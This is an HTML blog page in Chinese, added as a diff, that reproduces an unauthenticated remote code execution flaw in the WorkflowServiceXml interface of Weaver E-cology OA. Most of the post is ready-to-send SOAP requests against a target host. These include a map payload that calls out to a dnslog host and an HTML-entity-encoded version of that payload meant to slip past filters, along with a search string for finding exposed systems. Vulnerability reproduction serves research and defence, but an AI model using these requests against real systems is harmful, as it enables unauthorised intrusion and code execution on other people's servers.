@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+  <meta http-equiv="content-type" content="text/html;charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noodp"/>
+  <meta name="author" content="Olist.213">
+  <meta name="description" content="一点牢骚">
+  
+  
+  <link rel="prev" href="https://olist213.github.io/posts/vs2019-build-masscan/" />
+  
+  <link rel="canonical" href="https://olist213.github.io/posts/e-cology-workflowservicexml-rce/" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+  <link rel="manifest" href="/site.webmanifest">
+  <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+  <meta name="msapplication-TileColor" content="#da532c">
+  <meta name="theme-color" content="#ffffff">
+  <title>
+       
+       
+           E Cology WorkflowServiceXml RCE | Olist.213
+       
+  </title>
+  <meta name="title" content="E Cology WorkflowServiceXml RCE | Olist.213">
+    
+  
+  <link rel="stylesheet" href="/font/iconfont.css">
+  <link rel="stylesheet" href="/css/main.min.css">
+
+
+  
+  
+ 
+
+<script type="application/ld+json">
+ "@context" : "http://schema.org",
+    "@type" : "BlogPosting",
+    "mainEntityOfPage": {
+         "@type": "WebPage",
+         "@id": "https:\/\/olist213.github.io"
+    },
+    "articleSection" : "posts",
+    "name" : "E Cology WorkflowServiceXml RCE",
+    "headline" : "E Cology WorkflowServiceXml RCE",
+    "description" : "漏洞描述 泛微E-cology OA系统的WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程代码执行\n漏洞影响   E-cology \u0026lt;= 9.0\n  app=\u0026ldquo;泛微-协同办公OA\u0026rdquo;\n  漏洞复现 1、构造如下请求，返回Invaild SOAP request表示漏洞存在。\n2、POST如下请求：\nGET \/services%20\/WorkflowServiceXml HTTP\/1.1 Host: x.x.19.86:88 User-Agent: Mozilla\/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit\/537.36 (KHTML, like Gecko) Chrome\/90.0.4430.212 Safari\/537.36 Accept-Encoding: gzip, deflate Connection: close content-type: text\/xml;charset=UTF-8 Content-Length: 347 \u0026lt;soapenv:Envelope xmlns:soapenv=\u0026#34;http:\/\/schemas.xmlsoap.org\/soap\/envelope\/\u0026#34; xmlns:web=\u0026#34;webservices.services.weaver.com.cn\u0026#34;\u0026gt; \u0026lt;soapenv:Header\/\u0026gt; \u0026lt;soapenv:Body\u0026gt; \u0026lt;web:doCreateWorkflowRequest\u0026gt; \u0026lt;web:string\u0026gt;\u0026lt;\/web:string\u0026gt; \u0026lt;web:string\u0026gt;2\u0026lt;\/web:string\u0026gt; \u0026lt;\/web:doCreateWorkflowRequest\u0026gt; \u0026lt;\/soapenv:Body\u0026gt; \u0026lt;\/soapenv:Envelope\u0026gt; 3、利用dnslog服务器进行请求，在web:string中加入如下内容,url为dnslog的地址：\n\u0026lt;map\u0026gt; \u0026lt;entry\u0026gt; \u0026lt;url\u0026gt;http:\/\/1xsz12.dnslog.cn\u0026lt;\/url\u0026gt; \u0026lt;string\u0026gt;http:\/\/1xsz12.dnslog.cn\u0026lt;\/string\u0026gt; \u0026lt;\/entry\u0026gt; \u0026lt;\/map\u0026gt; 4、将上述内容进行html转义，利用burp的功能。GET \/services%20\/WorkflowServiceXml HTTP\/1.1 Host: x.x.19.86:88 User-Agent: Mozilla\/5.",
+    "inLanguage" : "zh-cn",
+    "author" : "",
+    "creator" : "",
+    "publisher": "",
+    "accountablePerson" : "",
+    "copyrightHolder" : "",
+    "copyrightYear" : "2021",
+    "datePublished": "2021-05-17 19:28:31 \u002b0800 CST",
+    "dateModified" : "2021-05-17 19:28:31 \u002b0800 CST",
+    "url" : "https:\/\/olist213.github.io\/posts\/e-cology-workflowservicexml-rce\/",
+    "wordCount" : "98",
+    "keywords" : [  "Olist.213"]
+}
+</script>
+
+</head>
+
+  
+
+
+  <body class="">
+    <div class="wrapper">
+        <nav class="navbar">
+    <div class="container">
+        <div class="navbar-header header-logo">
+        	<a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a>
+        </div>
+        <div class="menu navbar-right">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+<nav class="navbar-mobile" id="nav-mobile" style="display: none">
+     <div class="container">
+        <div class="navbar-header">
+            <div>  <a href="javascript:void(0);" class="theme-switch"><i class="iconfont icon-xihuan"></i></a>&nbsp;<a href="https://olist213.github.io">Olist.213</a></div>
+            <div class="menu-toggle">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+     
+          <div class="menu" id="mobile-menu">
+                
+                
+                <a class="menu-item" href="/posts/" title="">Blog&#39;s</a>
+                
+                <a class="menu-item" href="/categories/" title="">Categories</a>
+                
+                <a class="menu-item" href="/tags/" title="">Tags</a>
+                
+                <a class="menu-item" href="/about/" title="">About</a>
+                
+                <a class="menu-item" href="/study_book/" title="">学习笔记Day</a>
+                
+                <a class="menu-item" href="/security_process/" title="">安全流程</a>
+                
+        </div>
+    </div>
+</nav>
+    	 <main class="main">
+          <div class="container">
+      		
+<article class="post-warp" itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">E Cology WorkflowServiceXml RCE</h1>
+        <div class="post-meta">
+                Written by <a itemprop="name" href="https://olist213.github.io" rel="author"></a> with ♥ 
+                <span class="post-time">
+                on <time datetime=2021-05-17 itemprop="datePublished">May 17, 2021</time>
+                </span>
+                in
+                
+        </div>
+    </header>
+    <div class="post-content">
+        
+
+        
+            
+        
+
+        
+        
+     
+          
+          
+          
+
+          
+          
+          
+
+          <h1 id="漏洞描述">漏洞描述</h1>
+<p>泛微E-cology OA系统的WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程代码执行</p>
+<h1 id="漏洞影响">漏洞影响</h1>
+<ul>
+<li>
+<p>E-cology &lt;= 9.0</p>
+</li>
+<li>
+<p>app=&ldquo;泛微-协同办公OA&rdquo;</p>
+</li>
+</ul>
+<h1 id="漏洞复现">漏洞复现</h1>
+<p>1、构造如下请求，返回Invaild SOAP request表示漏洞存在。</p>
+<p><img src="/images/E-Cology-WorkflowServiceXml-RCE.assets/image-20210517193012777.png" alt="image-20210517193012777"></p>
+<p>2、POST如下请求：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET /services%20/WorkflowServiceXml HTTP/1.1
+Host: x.x.19.86:88
+User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/90.0.4430.212 Safari/537.36
+Accept-Encoding: gzip, deflate
+Connection: close
+content-type: text/xml;charset<span style="color:#f92672">=</span>UTF-8
+Content-Length: <span style="color:#ae81ff">347</span>
+
+&lt;soapenv:Envelope xmlns:soapenv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> xmlns:web<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;webservices.services.weaver.com.cn&#34;</span>&gt;
+   &lt;soapenv:Header/&gt;
+   &lt;soapenv:Body&gt;
+      &lt;web:doCreateWorkflowRequest&gt;
+    &lt;web:string&gt;&lt;/web:string&gt;
+        &lt;web:string&gt;2&lt;/web:string&gt;
+      &lt;/web:doCreateWorkflowRequest&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre></div><p><img src="/images/E-Cology-WorkflowServiceXml-RCE.assets/image-20210517193208251.png" alt="image-20210517193208251"></p>
+<p>3、利用dnslog服务器进行请求，在web:string中加入如下内容,url为dnslog的地址：</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&lt;map&gt;
+  &lt;entry&gt;
+    &lt;url&gt;http://1xsz12.dnslog.cn&lt;/url&gt;
+    &lt;string&gt;http://1xsz12.dnslog.cn&lt;/string&gt;
+  &lt;/entry&gt;
+&lt;/map&gt;
+</code></pre></div><p>4、将上述内容进行html转义，利用burp的功能。<img src="/images/E-Cology-WorkflowServiceXml-RCE.assets/image-20210517193546747.png" alt="image-20210517193546747"></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">GET /services%20/WorkflowServiceXml HTTP/1.1
+Host: x.x.19.86:88
+User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/90.0.4430.212 Safari/537.36
+Accept-Encoding: gzip, deflate
+Connection: close
+content-type: text/xml;charset<span style="color:#f92672">=</span>UTF-8
+Content-Length: <span style="color:#ae81ff">1009</span>
+
+&lt;soapenv:Envelope xmlns:soapenv<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span> xmlns:web<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;webservices.services.weaver.com.cn&#34;</span>&gt;
+   &lt;soapenv:Header/&gt;
+   &lt;soapenv:Body&gt;
+      &lt;web:doCreateWorkflowRequest&gt;
+    &lt;web:string&gt;
+&amp;lt;&amp;<span style="color:#75715e">#109;&amp;#97;&amp;#112;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;lt;&amp;#101;&amp;#110;&amp;#116;&amp;#114;&amp;#121;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#117;&amp;#114;&amp;#108;&amp;gt;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#108;&amp;#107;&amp;#120;&amp;#52;&amp;#115;&amp;#122;&amp;#46;&amp;#100;&amp;#110;&amp;#115;&amp;#108;&amp;#111;&amp;#103;&amp;#46;&amp;#99;&amp;#110;&amp;lt;&amp;#47;&amp;#117;&amp;#114;&amp;#108;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;#32;&amp;#32;&amp;lt;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#108;&amp;#107;&amp;#120;&amp;#52;&amp;#115;&amp;#122;&amp;#46;&amp;#100;&amp;#110;&amp;#115;&amp;#108;&amp;#111;&amp;#103;&amp;#46;&amp;#99;&amp;#110;&amp;lt;&amp;#47;&amp;#115;&amp;#116;&amp;#114;&amp;#105;&amp;#110;&amp;#103;&amp;gt;&amp;#13;&amp;#10;&amp;#32;&amp;#32;&amp;lt;&amp;#47;&amp;#101;&amp;#110;&amp;#116;&amp;#114;&amp;#121;&amp;gt;&amp;#13;&amp;#10;&amp;lt;&amp;#47;&amp;#109;&amp;#97;&amp;#112;&amp;gt;</span>
+&lt;/web:string&gt;
+        &lt;web:string&gt;2&lt;/web:string&gt;
+      &lt;/web:doCreateWorkflowRequest&gt;
+   &lt;/soapenv:Body&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre></div><p><img src="/images/E-Cology-WorkflowServiceXml-RCE.assets/image-20210517193301570.png" alt="image-20210517193301570"></p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Olist.213 </span>
+                </p>
+            
+           
+             
+            <p class="copyright-item">
+                    <span>Link:</span>
+                    <a href=https://olist213.github.io/posts/e-cology-workflowservicexml-rce/>https://olist213.github.io/posts/e-cology-workflowservicexml-rce/</span>
+            </p>
+            
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+        <section>
+                <a href="javascript:window.history.back();">back</a></span> · 
+                <span><a href="https://olist213.github.io">home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://olist213.github.io/posts/vs2019-build-masscan/" class="prev" rel="prev" title="vs2019编译masscan"><i class="iconfont icon-left"></i>&nbsp;vs2019编译masscan</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+                 
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2018 - 2021</span>
+        
+        <span class="with-love">
+    	 <i class="iconfont icon-love"></i> 
+         </span>
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://olist213.github.io">Olist.213</a> | </span> 
+         
+
+         
+		  <span>Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow">Hugo</a> & <a href="https://github.com/liuzc/leaveit" target="_blank" rel="external nofollow">LeaveIt</a></span> 
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+     <link href="//lib.baomitu.com/lightgallery/1.6.11/css/lightgallery.min.css" rel="stylesheet">  
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+     </div>
+  </body>
+</html>
